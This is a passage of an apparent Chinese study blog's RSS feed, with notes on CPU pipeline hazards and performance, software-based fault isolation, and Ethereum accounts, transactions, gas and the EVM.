&lt;/ul&gt;
&lt;h2 id=&#34;流水线分类&#34;&gt;流水线分类
&lt;/h2&gt;&lt;h3 id=&#34;按功能划分&#34;&gt;按功能划分
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;单功能流水线&lt;/li&gt;
&lt;li&gt;多功能流水线&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;按照并行性划分针对多功能流水线&#34;&gt;按照并行性划分（针对多功能流水线）
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;静态流水线：多功能，但不支持混合任务。即同一时间段内智能固定配置为一种任务。切换任务需要排空当前流水线&lt;/li&gt;
&lt;li&gt;动态流水线：支持混合任务&lt;/li&gt;
&lt;li&gt;注：可以用咖啡机来做比喻。单功能流水线就是一台只能做美式咖啡的咖啡机。静态流水线可以做多种咖啡，但是每次切换口味需要清空管道。动态流水线可以同时制作多种咖啡。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;按照运行顺序划分&#34;&gt;按照运行顺序划分
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;顺序流水线：任务的流出和流入顺序相同，上面的演示都是顺序流水线&lt;/li&gt;
&lt;li&gt;乱序流水线：任务的流出和流入顺序可以不同，允许先完成后面的任务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;按硬件划分&#34;&gt;按硬件划分
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;部件级流水线/操作流水线：将处理器的算术逻辑运算部件（ALU）分段，使得各种类型的运算可以通过流水线方式执行。这是CPU内部针对单个复杂功能单元的流水化。例如，一个浮点乘法器可以被分成多个阶段（阶码处理、尾数处理、规格化等），从而让多个浮点乘法操作在内部重叠执行，提高该部件的吞吐率。&lt;/li&gt;
&lt;li&gt;处理器级流水线/指令流水线：指令的解释和执行通过流水线实现。一条指令的执行过程被分成若干个子过程，每个子过程在一个独立的功能单元中执行。上面的演示都是指令流水线。RISC五级流水线就是一种指令流水线设计。&lt;/li&gt;
&lt;li&gt;处理器间流水线/宏流水线：两个或更多处理器的连接，用于处理同一个数据流，每个处理器完成整个任务的一部分。常用于高性能计算或流处理系统&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;按照线性性划分&#34;&gt;按照线性性划分
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;线性流水线：各阶段串行连接，没有反馈回路。数据每个阶段中在每个段最多流过一次&lt;/li&gt;
&lt;li&gt;非线性流水线：存在反馈回路，允许数据流回前面的阶段再次处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;基于risc-v的流水线cpu&#34;&gt;基于RISC-V的流水线CPU
&lt;/h2&gt;&lt;h3 id=&#34;risc-v的流水线友好设计&#34;&gt;RISC-V的流水线友好设计
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;所有指令都是32位&lt;/li&gt;
&lt;li&gt;精简和规整的指令格式&lt;/li&gt;
&lt;li&gt;Load/Store架构&lt;/li&gt;
&lt;li&gt;内存操作数强制对齐&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;流水线吞吐量&#34;&gt;流水线吞吐量
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;公式定义
$$TP = \frac{n}{T}$$
n: 处理的指令总数（任务数量）
T: 完成任务的总时间
物理意义：单位时间内完成的指令数&lt;/li&gt;
&lt;li&gt;性能上限约束
$$TP &lt; TP_{max}$$
含义：实际吞吐量永远低于理论极限值&lt;/li&gt;
&lt;li&gt;实际运行时间
$$ T = (m+n-1) \times Δt_0 \newline
     TP = \frac{n}{T} = \frac{n}{(m+n-1) \times Δt_0}\newline
     TP_{max} = \frac{1}{Δt_0}
  $$
可以发现当$n &amp;raquo; m$时，有$TP \approx TP_{max}$
可以写成
$$ TP = \frac{n}{n+m-1}TP_{max}$$&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;应用场景下的流水线吞吐量&#34;&gt;应用场景下的流水线吞吐量
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;如之前的演示所反映的，流水线在实际可能会遇到瓶颈问题。容易想到，这一问题可以通过将时钟周期设置为最慢阶段耗时来解决，但这并不能提高效率。为了实际提高效率有其他解法&lt;/li&gt;
&lt;li&gt;解决方案
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;细分(Subdivision)&lt;/strong&gt;：将最长的阶段拆分为多个子阶段，每段耗时$Δt$&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源复制(Repetition)&lt;/strong&gt;：每$Δt$可开始一个新任务。这一解决方案实质上是在S2的内部执行并行加速。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;更多性能衡量指标sp与η&#34;&gt;更多性能衡量指标——Sp与η
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Sp&lt;/strong&gt;(speed up)
$$Sp = \frac{n \times m \times Δt_0}{(m+n-1)Δt_0} = \frac{n \times m}{m + n -1}$$
Sp衡量的是流水线相较串行加快运行速度的程度，当$n&amp;raquo;m$，即输入数据很多时，有$Sp \approx m$，逼近上确界&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;η&lt;/strong&gt;(Efficiency)
$$η = \frac{Sp}{m} = \frac{n}{m+n-1}$$
η的含义是实际加速比比理论最大加速比，当$n&amp;raquo;m$，即输入数据很多时，有$η \approx 1$，逼近上确界&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;流水线冒险&#34;&gt;流水线冒险
&lt;/h2&gt;&lt;p&gt;在前面的演示中，已经看到了流水线中存在运行冲突的现象。事实上实践中可能发生的冲突情况较多，它们被统称为hazard（冒险）&lt;/p&gt;
&lt;h3 id=&#34;冒险类型&#34;&gt;冒险类型
&lt;/h3&gt;&lt;h4 id=&#34;数据冒险&#34;&gt;数据冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;以上的演示都未展示具体的指令内容和访问的对象，并且默认了各条指令间是独立的。但在实践场景中，指令间可能是关联的，这将引发&lt;strong&gt;数据冒险&lt;/strong&gt;。如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;x5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;可以看到第二条指令用到了第一条指令应在wb阶段写入的数据，流程图如下
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline9.png&#34; alt=&#34;冒险1&#34; width=&#34;75%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;可以看到在第一个指令完成WB之前就执行了第二个指令的ID，这会导致第二条指令无法去到正确的x1值。这种错误被称为&lt;strong&gt;读后写&lt;/strong&gt;(RAW - Read After Write)&lt;/li&gt;
&lt;li&gt;此外还有一种较为少见的冒险&lt;strong&gt;写后读&lt;/strong&gt;(WAR - Write After Read)。如果我们按照上面的演示思路来思考，会发现似乎是不会出现写后读问题的，这是因为写后读事实上一般出现在乱序执行的处理器中。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;sub&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;r5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;在乱序执行的处理器中，可能有R2的WB在R1的ID前完成的情况，此时指令1读取r2值时读到的是被写入的新值而不是想要写的值。这种错误就是写后读&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;结构冒险&#34;&gt;结构冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;除去因为数据处理顺序的原因产生的冒险，如上面提到的，实践中可能存在不同指令的不同阶段访问相同硬件资源的问题，这也会引发冒险，被称为&lt;strong&gt;结构冒险&lt;/strong&gt;
  &lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline10.png&#34; alt=&#34;冒险1&#34; width=&#34;100%&#34;&gt;
  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;如图，存在两条指令的IF和MEM阶段重叠，同时访问内存，产生冒险&lt;/li&gt;
&lt;li&gt;此外，同时访问只有一个写入端口的寄存器也会相似地产生结构冒险&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;控制分支冒险&#34;&gt;控制/分支冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;在上面的例子中，相邻指令都是物理相邻的，即下一条指令的地址即为上一条指令+4，可以在读上一条指令时即确定下一条指令地址。但是如果上一条指令是跳转指令，那么要等到上一条指令执行完，才能解析出下一条指令的地址，这种情况下就可能发生&lt;strong&gt;控制/分支冒险&lt;/strong&gt;
&lt;p align=&#34;center&#34;&gt;
      &lt;img src=&#34;https://example.com/images/pipeline11.png&#34; alt=&#34;冒险1&#34; width=&#34;140%&#34;&gt;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;可以看到在还不知道跳转指令的跳转地址时，后续指令已经执行了IF，这里的地址是预测性的，如果预测错误，在后续会被冲掉，这就是控制/分支冒险&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;解决冒险&#34;&gt;解决冒险
&lt;/h3&gt;&lt;h4 id=&#34;数据冒险-1&#34;&gt;数据冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;旁路
&lt;ul&gt;
&lt;li&gt;原理：当指令的结果在流水线中计算出来后不等待其写回寄存器，而是直接用专门的数据通路（旁路）将结果转发给需要的后续指令&lt;/li&gt;
&lt;li&gt;缺点：不能解决所有RAW，特别是当数据来自load指令时，数据在mem阶段菜可用，如果后续指令在mem前就需要，仍然会产生停顿&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;暂停/气泡
&lt;ul&gt;
&lt;li&gt;原理：当旁路无法解决冒险时，流水线控制器会插入一个或多个“气泡”（即空操作），强制延迟后续指令知道数据可用&lt;/li&gt;
&lt;li&gt;缺点：引入停顿，降低了流水线的CPI（每条指令的时钟周期），从未降低了性能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;寄存器重命名
&lt;ul&gt;
&lt;li&gt;原理：主要用于解决WAR（写后读）和WAW（写后写）这两种“假”数据依赖（或称名称依赖，Name Dependencies）。处理器为逻辑寄存器分配不同的物理寄存器，这样，不同的指令即使操作同一个逻辑寄存器，也可以写入到不同的物理寄存器，从而消除冲突，允许指令乱序执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;结构冒险-1&#34;&gt;结构冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;复制资源
&lt;ul&gt;
&lt;li&gt;原理：为发生冲突的硬件增加额外的副本。这是最直接和有效的解决方案&lt;/li&gt;
&lt;li&gt;示例
&lt;ul&gt;
&lt;li&gt;内存端口冲突：采用哈弗架构，提供独立的指令内存和数据内存，或者在cpu内部设置独立的指令缓存和数据缓存，从而允许同时访问&lt;/li&gt;
&lt;li&gt;功能单元冲突：如果alu是瓶颈，可以增加多个alu，以便不同的指令可以并行使用&lt;/li&gt;
&lt;li&gt;寄存器文件端口冲突：增加寄存器文件的读写端口数量，允许在同一周期内进行更多的读写操作&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点：增加了硬件成本和复杂度&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;流水线暂停
&lt;ul&gt;
&lt;li&gt;原理：当发生结构冒险时，暂停其中一条指令，直到所需的资源可用&lt;/li&gt;
&lt;li&gt;缺点：引入停顿，降低性能。通常仅作为复制资源的后备方式或在复制资源代价过高时使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;控制冒险&#34;&gt;控制冒险
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;分支预测
&lt;ul&gt;
&lt;li&gt;通过复杂的硬件逻辑来预测分支的走向和目标地址&lt;/li&gt;
&lt;li&gt;分类：
&lt;ul&gt;
&lt;li&gt;静态预测：基于编译时的信息和简单的经验法则&lt;/li&gt;
&lt;li&gt;动态预测：基于历史行为来预测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;延迟分支
&lt;ul&gt;
&lt;li&gt;原理：在分支指令后紧接着一条或几条分支延迟槽指令&lt;/li&gt;
&lt;li&gt;缺点：填充难度较大，在现代高性能处理器较少使用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;分支消除/条件执行&lt;/li&gt;
&lt;li&gt;原理：对一些简单的条件操作，可以通过硬件支持，将条件分支转换为无需跳转的条件执行指令。&lt;/li&gt;
&lt;li&gt;缺点：并非所有复杂的条件分支都能通过这种方式消除&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;流水线数据通路&#34;&gt;流水线数据通路
&lt;/h2&gt; &lt;p align=&#34;center&#34;&gt;
        &lt;img src=&#34;https://example.com/images/pipeline12.png&#34; alt=&#34;冒险1&#34; width=&#34;100%&#34;&gt;
  &lt;/p&gt;
</description>
        </item>
        <item>
        <title>SFI技术</title>
        <link>https://example.com/p/sfi%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Fri, 11 Jul 2025 22:01:43 +0800</pubDate>
        
        <guid>https://example.com/p/sfi%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;software-based-fault-isolation&#34;&gt;Software-Based Fault Isolation
&lt;/h1&gt;&lt;h2 id=&#34;隔离&#34;&gt;隔离
&lt;/h2&gt;&lt;h3 id=&#34;隔离方法&#34;&gt;隔离方法
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;基于硬件的虚拟化&lt;/li&gt;
&lt;li&gt;操作系统进程&lt;/li&gt;
&lt;li&gt;基于语言的隔离&lt;/li&gt;
&lt;li&gt;SFI&lt;/li&gt;
&lt;li&gt;性能对比&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;上下文切换开销&lt;/th&gt;
          &lt;th&gt;单指令开销&lt;/th&gt;
          &lt;th&gt;是否需要编译器支持&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;虚拟机&lt;/td&gt;
          &lt;td&gt;非常高&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;操作系统进程&lt;/td&gt;
          &lt;td&gt;高&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;基于语言的隔离&lt;/td&gt;
          &lt;td&gt;低&lt;/td&gt;
          &lt;td&gt;中或无（动态/静态检查）&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SFI&lt;/td&gt;
          &lt;td&gt;低&lt;/td&gt;
          &lt;td&gt;低&lt;/td&gt;
          &lt;td&gt;可能（二进制重写工具）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;sfi&#34;&gt;SFI
&lt;/h2&gt;&lt;h3 id=&#34;sfi基本介绍&#34;&gt;SFI基本介绍
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;核心机制
&lt;ul&gt;
&lt;li&gt;每个保护域（隔离模块）都被分配一个专属内存区域（沙盒）&lt;/li&gt;
&lt;li&gt;隔离发生在同一进程的地址空间内&lt;/li&gt;
&lt;li&gt;通过在关键指令前插入软件检查实现&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SFI沙盒构造
&lt;ul&gt;
&lt;li&gt;分为三部分
&lt;ul&gt;
&lt;li&gt;数据区域(DR，Data region): [DB, DL]
&lt;ul&gt;
&lt;li&gt;保存堆、栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;代码区域(CR, Code region): [DB, DL]
&lt;ul&gt;
&lt;li&gt;保存代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;安全外部地址(SE, Safe externel)
&lt;ul&gt;
&lt;li&gt;托管需要更高权限的受信任服务&lt;/li&gt;
&lt;li&gt;代码跳转到它们以访问资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DR,CR和SE不相交&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;隔离的实现
&lt;ul&gt;
&lt;li&gt;代码段不可写&lt;/li&gt;
&lt;li&gt;数据段不可执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;执法策略
&lt;ul&gt;
&lt;li&gt;检查每一个危险指令
&lt;ul&gt;
&lt;li&gt;危险指令: 读/写内存和控制转移指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;动态二进制翻译
&lt;ul&gt;
&lt;li&gt;在工作时拦截并重写危险指令，插入安全检查代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内联引用监控
&lt;ul&gt;
&lt;li&gt;在编译时静态插入安全检查指令&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;具体执法方式
&lt;ul&gt;
&lt;li&gt;原始执法方式
&lt;ul&gt;
&lt;li&gt;在指令前插入检查&lt;/li&gt;
&lt;li&gt;存在问题: 运行时开销高&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;仅完整性隔离
&lt;ul&gt;
&lt;li&gt;程序执行读远多于写，且在不考虑保密的情况下可以只检查写&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据区域专门化
&lt;ul&gt;
&lt;li&gt;数据区域地址具有相同的高位，被称作数据区域ID，检查地址是否配置了正确的数据区域ID即可&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;地址掩码
&lt;ul&gt;
&lt;li&gt;通过地址掩码将地址在执行前强制改写，使其指向数据段&lt;/li&gt;
&lt;li&gt;单指令地址掩码: 缩减到一次指令实现改写地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;data-guards&#34;&gt;Data Guards
&lt;/h3&gt;&lt;h4 id=&#34;引入伪指令&#34;&gt;引入伪指令
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;数据保护包含地址检查和地址屏蔽&lt;/li&gt;
&lt;li&gt;引入伪指令&lt;code&gt;r&#39; = dGuard(r)&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;该指令满足以下条件
&lt;ul&gt;
&lt;li&gt;如果r在DR中，r&amp;rsquo; = r&lt;/li&gt;
&lt;li&gt;否则
&lt;ul&gt;
&lt;li&gt;对于地址检查，进入错误状态&lt;/li&gt;
&lt;li&gt;对于地址掩码，r&amp;rsquo;获取到一个安全范围内的地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;guard-zones&#34;&gt;Guard Zones
&lt;/h4&gt;</description>
        </item>
        <item>
        <title>智能合约</title>
        <link>https://example.com/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</link>
        <pubDate>Fri, 11 Jul 2025 22:01:05 +0800</pubDate>
        
        <guid>https://example.com/p/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/</guid>
        <description>&lt;h1 id=&#34;smart-contract&#34;&gt;Smart Contract
&lt;/h1&gt;&lt;h2 id=&#34;研究对象etheremu&#34;&gt;研究对象————Etheremu
&lt;/h2&gt;&lt;h3 id=&#34;etheremu基础知识&#34;&gt;Etheremu基础知识
&lt;/h3&gt;&lt;h4 id=&#34;账户&#34;&gt;账户
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;外部账户(EOA)
&lt;ul&gt;
&lt;li&gt;外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。&lt;/li&gt;
&lt;li&gt;一个外部账户有以下特性：
&lt;ul&gt;
&lt;li&gt;拥有一定的Ether&lt;/li&gt;
&lt;li&gt;可以发送交易，由私钥控制&lt;/li&gt;
&lt;li&gt;没有相关联的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;合约账户
&lt;ul&gt;
&lt;li&gt;合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。&lt;/li&gt;
&lt;li&gt;一个合约账户有以下特性
&lt;ul&gt;
&lt;li&gt;拥有一定的Ether&lt;/li&gt;
&lt;li&gt;有关联代码，代码通过交易或其他合约发来的调用激活&lt;/li&gt;
&lt;li&gt;当合约被执行时，只能操作合约账户的特定存储&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在Etheremu中，这两种账户统称为“状态对象”，其中外部账户存储以太币余额状态，而合约账户除了余额还有智能合约及其变量的状态。通过交易的执行，这些状态对象发生变化，而 Merkle 树用于索引和验证状态对象的更新。一个以太坊的账户包含 4 个部分
&lt;ul&gt;
&lt;li&gt;nonce: 已执行交易总量&lt;/li&gt;
&lt;li&gt;balance: 帐持币数量&lt;/li&gt;
&lt;li&gt;storageRoot: 存储区哈希值&lt;/li&gt;
&lt;li&gt;codeHash: 代码区哈希值&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;两个外部账户之间的交易只是一个价值转移；而外部账户和合约账户之间的交易会激活合约账户的代码，允许进行各种操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;交易&#34;&gt;交易
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;交易指的是外部账户发送到另一账户的的消息的签名数据包&lt;/li&gt;
&lt;li&gt;交易内容
&lt;ul&gt;
&lt;li&gt;from: 交易发送者地址&lt;/li&gt;
&lt;li&gt;to: 交易接收者地址，如果为空代表创建或调用智能合约&lt;/li&gt;
&lt;li&gt;value: 转移的以太币数量&lt;/li&gt;
&lt;li&gt;data: 数据字段，如果存在，说明是一个创建或调用智能合约的交易&lt;/li&gt;
&lt;li&gt;gaslimit: 交易允许消耗的最大gas数量&lt;/li&gt;
&lt;li&gt;gasprice: 愿意发送给gas矿工的单价&lt;/li&gt;
&lt;li&gt;nonce: 区分同一账户的不容交易的标记&lt;/li&gt;
&lt;li&gt;hash: 以上信息生成的散列值&lt;/li&gt;
&lt;li&gt;r,s,v: 签名信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;交易类型：
&lt;ul&gt;
&lt;li&gt;执行转账的交易&lt;/li&gt;
&lt;li&gt;创建智能合约的交易&lt;/li&gt;
&lt;li&gt;调用智能合约的交易&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;rpc&#34;&gt;RPC
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;JSON-RPC是一种无状态、轻量级的远程过程调用(RPC)协议。它定义了几种数据结构及处理规则。用于实现软件应用程序与Etheremu区块链的交互&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;转账&#34;&gt;转账
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;操作过程：
&lt;ul&gt;
&lt;li&gt;生成一个交易，使用私钥签名&lt;/li&gt;
&lt;li&gt;被签名的交易被广播到P2P网络&lt;/li&gt;
&lt;li&gt;矿工将交易包含在一个块中&lt;/li&gt;
&lt;li&gt;确认资金转账&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;燃料gas&#34;&gt;燃料(Gas)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;需要设置Gas的原因: 处理停机问题（无限循环）&lt;/li&gt;
&lt;li&gt;Gas limit: 用户单次交易的gas上限&lt;/li&gt;
&lt;li&gt;Gas price: Gas的当前单价，在交易前由用户设置，以Wei为单位&lt;/li&gt;
&lt;li&gt;交易费用: Gas*Gas_price&lt;/li&gt;
&lt;li&gt;Gas消耗：
&lt;ul&gt;
&lt;li&gt;对于一般交易，消耗为21000&lt;/li&gt;
&lt;li&gt;对于智能合约，取决于消耗的资源————执行的命令和使用的存储&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;evm&#34;&gt;EVM
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;每个Etheremu节点都包含一个虚拟机，该虚拟机被称为EVM，发挥执行智能合约代码和更改并广播全局状态的作用&lt;/li&gt;
&lt;li&gt;特性：
&lt;ul&gt;
&lt;li&gt;图灵完备性（存在Gas限制）&lt;/li&gt;
&lt;li&gt;无浮点数&lt;/li&gt;
&lt;li&gt;无系统时钟&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;核心设计目标:
&lt;ul&gt;
&lt;li&gt;确定性: 保证相同的输入必定有相同的输出&lt;/li&gt;
&lt;li&gt;隔离性: 合约在沙盒环境中运行，不直接访问主机系统&lt;/li&gt;
&lt;li&gt;可终止性: 通过Gas限制执行步骤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;结构：
&lt;ul&gt;
&lt;li&gt;基于堆栈
&lt;ul&gt;
&lt;li&gt;注: 栈式架构特点
&lt;ul&gt;
&lt;li&gt;所有计算依赖操作数栈&lt;/li&gt;
&lt;li&gt;没有通用寄存器&lt;/li&gt;
&lt;li&gt;指令隐式操作栈&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
